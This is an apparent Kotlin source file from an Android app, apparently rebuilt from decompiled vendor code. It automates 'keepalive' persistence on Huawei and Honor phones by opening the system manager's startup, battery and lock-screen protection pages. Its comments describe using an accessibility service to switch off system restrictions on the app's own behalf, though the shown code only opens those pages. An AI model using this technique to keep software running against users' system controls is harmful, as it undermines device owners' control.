package com.storm.safe.rock.service.modules.yw5xud

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.util.Log
import com.storm.safe.rock.service.MyAccessibilityService
import kotlinx.coroutines.delay

/**
 * HuaweiSteps — Huawei/Honor (EMUI/HarmonyOS/MagicOS) keepalive permission automation.
 * Matches vendor C0365a2 (a2, HuaweiSteps). Key flows:
 *
 * 1. Startup management (启动管理) — "自动管理" switch OFF
 *    - Navigate to: com.huawei.systemmanager/.startupmgr.ui.StartupNormalAppListActivity
 *    - Find our app, disable "自动管理" (auto-manage = restrictive)
 *    - Enable manual control: 允许自启动, 允许关联启动, 允许后台活动
 * 2. Battery optimization
 *    - Navigate to battery optimization settings
 *    - Set to "不优化" (Don't optimize)
 * 3. Lock screen cleanup (锁屏清理)
 *    - Navigate to: com.huawei.systemmanager/.optimize.process.ProtectActivity
 *    - Enable our app in the protected list
 * 4. Background management popup (后台管理弹窗)
 *    - Handle the "该应用在后台运行" popup
 *    - Click "允许" to keep running
 *
 * Special: HonorClickResult, LockVerifyResult, VerifyResult sealed results
 */
class HuaweiSteps(
    private val service: MyAccessibilityService?,
    private val context: Context
) {
    companion object {
        private const val TAG = "HuaweiSteps"

        // Startup manager components (4-level fallback per vendor)
        val STARTUP_COMPONENTS = listOf(
            ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"),
            ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity"),
            ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity"),
            ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.startupmgr.ui.StartupManagerActivity")
        )

        val BATTERY_COMPONENTS = listOf(
            ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.power.ui.HwPowerManagerActivity"),
            ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.power.ui.HwBatterySettings")
        )

        val LOCK_SCREEN_COMPONENTS = listOf(
            ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity")
        )

        /** Keywords for finding auto-manage switch. */
        val AUTO_MANAGE_KEYWORDS = listOf("自动管理", "自动运行", "Auto-manage", "Auto manage")

        /** Keywords for startup allow options. */
        val STARTUP_ALLOW_KEYWORDS = listOf(
            "允许自启动", "允许关联启动", "允许后台活动",
            "Allow auto-launch", "Allow associated startup", "Allow background activity"
        )

        /** Keywords for "不优化" in battery settings. */
        val DONT_OPTIMIZE_KEYWORDS = listOf("不优化", "Don't optimize", "Not optimized", "无限制")
    }

    /** Result types matching vendor inner classes */
    sealed class StepResult {
        data class Success(val message: String) : StepResult()
        data class Failure(val message: String) : StepResult()
        data class NeedVerify(val message: String) : StepResult()
    }

    suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        logs.add("HuaweiSteps: 开始华为/荣耀权限配置")

        executeStartupManager(successes, failures, logs)
        delay(500)
        executeBatteryOptimization(successes, failures, logs)
        delay(500)
        executeLockScreenCleanup(successes, failures, logs)

        logs.add("HuaweiSteps: 华为/荣耀权限配置完成")
    }

    /**
     * Navigate to startup manager and configure auto-launch settings.
     * Vendor: executeStartupManager flow with 4-level component fallback.
     */
    fun executeStartupManager(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        try {
            val launched = launchComponentActivity(STARTUP_COMPONENTS)
            if (launched) {
                logs.add("已启动华为启动管理")
                successes.add("华为启动管理已打开")
            } else {
                failures.add("无法启动华为启动管理（尝试${STARTUP_COMPONENTS.size}个组件）")
            }
        } catch (e: Exception) {
            failures.add("华为启动管理异常: ${e.message}")
        }
    }

    /**
     * Navigate to battery optimization and set to unrestricted.
     */
    fun executeBatteryOptimization(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        try {
            val launched = launchComponentActivity(BATTERY_COMPONENTS)
            if (launched) {
                logs.add("已启动华为电池管理")
                successes.add("华为电池优化已打开")
            } else {
                // Fallback to standard battery optimization
                val intent = Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = android.net.Uri.parse("package:${context.packageName}")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
                logs.add("已发送电池优化豁免请求(标准)")
            }
        } catch (e: Exception) {
            failures.add("华为电池优化异常: ${e.message}")
        }
    }

    /**
     * Navigate to lock screen cleanup settings and protect our app.
     */
    fun executeLockScreenCleanup(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        try {
            val launched = launchComponentActivity(LOCK_SCREEN_COMPONENTS)
            if (launched) {
                logs.add("已启动华为锁屏清理设置")
                successes.add("华为锁屏清理保护已打开")
            } else {
                logs.add("华为锁屏清理页面无法启动, 跳过")
            }
        } catch (e: Exception) {
            failures.add("华为锁屏清理异常: ${e.message}")
        }
    }

    /** Try launching each component in order. */
    internal fun launchComponentActivity(components: List<ComponentName>): Boolean {
        for (component in components) {
            try {
                val intent = Intent().apply {
                    this.component = component
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
                return true
            } catch (_: Exception) { continue }
        }
        return false
    }
}
